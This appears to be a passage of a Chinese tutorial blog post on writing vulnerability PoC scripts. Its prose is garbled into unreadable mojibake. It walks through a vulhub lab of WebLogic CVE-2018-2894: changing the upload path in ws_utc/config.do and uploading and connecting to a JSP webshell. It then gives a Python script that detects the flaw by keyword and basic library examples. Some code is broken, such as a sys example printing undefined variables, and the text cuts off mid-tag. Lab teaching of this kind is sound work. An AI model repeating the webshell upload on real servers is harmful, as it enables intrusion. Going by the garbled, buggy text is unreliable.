title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ vulhub</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># è¿›å…¥weblogic CVE-2018-2894 ç›®å½•è¾“å…¥å‘½ä»¤å¯åŠ¨ç¯å¢ƒ</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185510842.png" data-caption="image-20230520185510842"><img src="/../images/poc/image-20230520185510842.png" alt="image-20230520185510842"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185538534.png" data-caption="image-20230520185538534"><img src="/../images/poc/image-20230520185538534.png" alt="image-20230520185538534"></a></p><p>æŸ¥çœ‹å¾—çŸ¥è´¦æˆ·å¯†ç  <code>weblogic/5Qdm6pID</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs | grep password</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185629947.png" data-caption="image-20230520185629947"><img src="/../images/poc/image-20230520185629947.png" alt="image-20230520185629947"></a></p><p>è¯¥æ¼æ´å¤„äºåå°ï¼Œæ¼æ´å­˜åœ¨æ¡ä»¶é™åˆ¶ï¼Œå½“åå° <code>å‹¾é€‰å¯ç”¨WebæœåŠ¡æµ‹è¯•é¡µ</code>ï¼Œç”¨æˆ·å¯åœ¨ <code>ws_utc/config.do</code> è·¯å¾„ä¸‹ä¸Šä¼ ä»»æ„æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190048572.png" data-caption="image-20230520190048572"><img src="/../images/poc/image-20230520190048572.png" alt="image-20230520190048572"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190119923.png" data-caption="image-20230520190119923"><img src="/../images/poc/image-20230520190119923.png" alt="image-20230520190119923"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190136117.png" data-caption=""><img src="/../images/poc/image-20230520190136117.png" alt=""></a></p><p>è®¿é—® <code>ws_utc/config.do</code> è·¯å¾„ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼ŒåŸè·¯å¾„<code>/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir</code>æ–‡ä»¶ä¸Šä¼ åæ— æ³•è®¿é—®ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹è·¯å¾„æ— éœ€æƒé™å³å¯è®¿é—®åˆ°ä¸Šä¼ çš„æ–‡ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">C:/Oracle\Middleware12.2.1.3/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190557626.png" data-caption="image-20230520190557626"><img src="/../images/poc/image-20230520190557626.png" alt="image-20230520190557626"></a></p><p>ä¸Šä¼ æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520191227232.png" data-caption="image-20230520191227232"><img src="/../images/poc/image-20230520191227232.png" alt="image-20230520191227232"></a></p><p>ä¸Šä¼ ä½ç½® <code>http://192.168.145.188:7001/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520191630280.png" data-caption="image-20230520191630280"><img src="/../images/poc/image-20230520191630280.png" alt="image-20230520191630280"></a></p><p>webshell è¿æ¥ <code>http://192.168.148.155:7001/ws_utc/css/config/keystore/1684581151178_shell.jsp</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520192008343.png" data-caption="image-20230520192008343"><img src="/../images/poc/image-20230520192008343.png" alt="image-20230520192008343"></a></p><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šWebLogic Server 10.3.6.0.0ã€WebLogic Server 12.1.3.0.0ã€WebLogic Server 12.2.1.2.0ã€WebLogic Server 12.2.1.3.0</p></blockquote><h4 id="POC-ä»£ç ç¼–å†™åˆ†æ-3"><a href="#POC-ä»£ç ç¼–å†™åˆ†æ-3" class="headerlink" title="POC ä»£ç ç¼–å†™åˆ†æ"></a>POC ä»£ç ç¼–å†™åˆ†æ</h4><p>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´å¤ç°å¯çŸ¥ï¼Œè¯¥æ¼æ´å­˜åœ¨äºåå°ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ€è·¯ç¼–å†™ Poc ä¼šæƒ³ç€å…ˆè§£å†³ç™»å½•é—®é¢˜ï¼Œç„¶åç™»å½•åå¸¦ç€è¯·æ±‚ç»§ç»­å»è¿›è¡Œè¯·æ±‚ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œæ ¹æ®è¿”å›çš„ä¿¡æ¯è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚ç”±äºè¯¥æ¼æ´æ˜¯å­˜åœ¨æ¡ä»¶é™åˆ¶çš„ï¼Œæˆ‘ä»¬éœ€å…ˆç™»å½•åï¼Œ <code>å¯ç”¨WebæœåŠ¡æµ‹è¯•é¡µ</code> ä¸”éœ€è¦æ›´æ”¹æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„æ‰èƒ½æ­£å¸¸è§¦å‘æ¼æ´ã€‚è‹¥æŒ‰ç…§ä¸€æ­¥æ­¥æ¥ <code>è¯·æ±‚ç™»å½•-ã€‹åˆ¤æ–­å‹¾é€‰å¯ç”¨WebæœåŠ¡æµ‹è¯•é¡µ-ã€‹ä¿®æ”¹æ–‡ä»¶ä¸Šä¼ è·¯å¾„-ã€‹ä¸Šä¼ æ–‡ä»¶</code>ï¼Œä¸€å¥—ç¼–å†™ä¸‹æ¥ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ª EXP äº†ï¼Œå¯¹äºä»…æ˜¯æ¼æ´éªŒè¯ï¼ˆPOCï¼‰çš„ç¼–å†™æ¥è¯´è¿‡äºå¤æ‚ï¼Œ è¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦æ ¹æ®è¿™ä¸ªæ¼æ´çš„ç‰¹æ€§å»åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´å³å¯ï¼Œä¸éœ€è¦æ•´ä¸ªæµç¨‹å»å¤åˆ»ã€‚</p><h4 id="åˆ†æå°ç»“-3"><a href="#åˆ†æå°ç»“-3" class="headerlink" title="åˆ†æå°ç»“"></a>åˆ†æå°ç»“</h4><p>åˆ†æåå‘ç°è‹¥å­˜åœ¨æ¼æ´ä¼šåœ¨ <code>/ws_utc/resources/setting/options/general</code> è·¯å¾„ä¸‹è®¿é—®åˆ°ä¸€ä¸ªç‰¹å®šçš„é¡µé¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç®€å•åŒ–ï¼Œé€šè¿‡æŠ“å–é¡µé¢å…³é”®å­—è¿›è¡Œæ¼æ´åˆ¤æ–­å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520193101165.png" data-caption="image-20230520193101165"><img src="/../images/poc/image-20230520193101165.png" alt="image-20230520193101165"></a></p><h4 id="Poc-åˆæ­¥ç¼–å†™-3"><a href="#Poc-åˆæ­¥ç¼–å†™-3" class="headerlink" title="Poc åˆæ­¥ç¼–å†™"></a>Poc åˆæ­¥ç¼–å†™</h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¼æ´url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/ws_utc/resources/setting/options/general&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›è¡Œgetè¯·æ±‚</span></span><br><span class="line">res = requests.get(url=url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹¥getè¯·æ±‚é¡µé¢ä¸­å­˜åœ¨&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;åˆ™å­˜åœ¨æ¼æ´</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨ CVE-2018-2894 WebLogicä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] ä¸å­˜åœ¨ CVE-2018-2894 WebLogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520193901587.png" data-caption="image-20230520193901587"><img src="/../images/poc/image-20230520193901587.png" alt="image-20230520193901587"></a></p><h4 id="å®Œå–„ä»£ç -3"><a href="#å®Œå–„ä»£ç -3" class="headerlink" title="å®Œå–„ä»£ç "></a>å®Œå–„ä»£ç </h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usageï¼špython3 demo.py -u [url]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___  __  ___      ___   ___   ___  _  _   </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |__ \ / _ \ / _ \| || |  </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | || | (_) |_____ ) | (_) | (_) | || |_ </span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | || |&gt; _ &lt;______/ / &gt; _ &lt; \__, |__   _|</span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| || | (_) |    / /_| (_) |  / /   | |  </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/ |_|\___/    |____|\___/  /_/    |_|                                                                      </span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">    <span class="comment"># å¼•å…¥ argument() å‡½æ•°</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½® headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è¿›è¡Œgetè¯·æ±‚</span></span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è‹¥getè¯·æ±‚é¡µé¢ä¸­å­˜åœ¨&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;åˆ™å­˜åœ¨æ¼æ´</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨ CVE-2018-2894 WebLogicä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] ä¸å­˜åœ¨ CVE-2018-2894 WebLogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æœ‰è¯¯!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520194921089.png" data-caption="image-20230520194921089"><img src="/../images/poc/image-20230520194921089.png" alt="image-20230520194921089"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a><a data-fancybox="gallery" data-src="/image-20230520195011233.png" data-caption="image-20230520195011233"><img src="/image-20230520195011233.png" alt="image-20230520195011233"></a></h2><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520195041850.png" data-caption="image-20230520195041850"><img src="/../images/poc/image-20230520195041850.png" alt="image-20230520195041850"></a></p><h2 id="å…­ã€æ€»ç»“"><a href="#å…­ã€æ€»ç»“" class="headerlink" title="å…­ã€æ€»ç»“"></a>å…­ã€æ€»ç»“</h2><p>é€šè¿‡ç»“åˆå‡ ä¸ªç±»å‹çš„æ¼æ´è¿›è¡Œ Poc ç¼–å†™ï¼Œå…¶æ¼æ´éªŒè¯æ‰‹æ®µä¸»è¦æ˜¯é€šè¿‡<code>åŒ¹é…æ¼æ´é¡µé¢çš„ç‰¹å¾ç </code>å»åˆ¤æ–­è¯¥ç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä¸»è¦ä½¿ç”¨äº† <code>requests</code> åº“å»å®ç°æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œè¯·æ±‚ï¼Œç„¶ååŒ¹é…ç‰¹å¾ç è¿›è¡Œæ¼æ´åˆ¤æ–­ï¼ŒPoc ç¼–å†™çš„éš¾åº¦ä¸å¤§ï¼Œè€Œå®Œæ•´çš„åˆ©ç”¨è„šæœ¬å³ Exp çš„ç¼–å†™éš¾åº¦ç›¸å¯¹ Poc éš¾åº¦è¦å¤§ä¸€ç‚¹ï¼Œä»£ç èƒ½åŠ›è¦æ±‚ä¹Ÿç›¸å¯¹è¦æ‰å®ä¸€ç‚¹ã€‚</p><h2 id="ä¸ƒã€æ‰©å±•"><a href="#ä¸ƒã€æ‰©å±•" class="headerlink" title="ä¸ƒã€æ‰©å±•"></a>ä¸ƒã€æ‰©å±•</h2><h3 id="sys-åº“"><a href="#sys-åº“" class="headerlink" title="sys åº“"></a>sys åº“</h3><p>ç±»ä¼¼äº argparse åº“ï¼Œç”¨äºå‚æ•°åŒ–è¾“å…¥</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># æ£€æŸ¥å‘½ä»¤è¡Œå‚æ•°æ•°é‡</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä½¿ç”¨æ–¹æ³•: python myapp.py &lt;å‚æ•°1&gt; &lt;å‚æ•°2&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å‚æ•°1:&quot;</span>, arg1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å‚æ•°2:&quot;</span>, arg2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿›è¡Œå…¶ä»–æ“ä½œ...</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="json-åº“"><a href="#json-åº“" class="headerlink" title="json åº“"></a>json åº“</h3><p>json åº“å¯ç”¨äºå¤„ç†JSONæ•°æ®</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¾“å‡º json ç‰¹å®šå‚æ•°å€¼</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">json_str = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30, &quot;city&quot;: &quot;New York&quot;&#125;&#x27;</span></span><br><span class="line">data = json.loads(json_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>]) </span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼šJohn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º json æ•°æ®</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json_str)</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœ:&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–json</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.json&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    data = json.load(json_file)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ•°æ®å†™å…¥jsonæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    json.dump(data, json_file)</span><br></pre></td></tr></table></figure></div><h3 id="time-åº“"><a href="#time-åº“" class="headerlink" title="time åº“"></a>time åº“</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">timestamp = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å½“å‰æ—¶é—´æˆ³:&quot;</span>, timestamp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºå¯è¯»æ—¶é—´</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">timestamp = <span class="number">1626832045</span>  <span class="comment"># ç¤ºä¾‹æ—¶é—´æˆ³</span></span><br><span class="line">readable_time = time.ctime(timestamp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å¯è¯»æ—¶é—´:&quot;</span>, readable_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å»¶è¿Ÿæ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å¼€å§‹æ‰§è¡Œ&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)  <span class="comment"># æš‚åœ2ç§’</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ç»§ç»­æ‰§è¡Œ&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®°å½•ä»£ç æ‰§è¡Œæ—¶é—´</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">res = requests.post(url, headers=headers, data=data) <span class="comment"># ä¾‹å­ï¼Œè®°å½•ç”¨æˆ·è¯·æ±‚å¼€å§‹æ—¶é—´ï¼ˆstart_timeï¼‰å’Œç»“æŸæ—¶é—´ï¼ˆend_timeï¼‰,äº res è¯·æ±‚ post æ•°æ®å¼€å§‹è®°å½•</span></span><br><span class="line">end_time = time.time()</span><br><span class="line"></span><br><span class="line">execution_time = end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(execution_time)</span><br></pre></td></tr></table></figure></div><h3 id="openå‡½æ•°"><a href="#openå‡½æ•°" class="headerlink" title="openå‡½æ•°"></a>openå‡½æ•°</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶è¿›è¡Œè¯»å–</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶è¿›è¡Œé€è¡Œè¯»å–</span></span><br><span class="line"><span class="keyword">with</span> <span 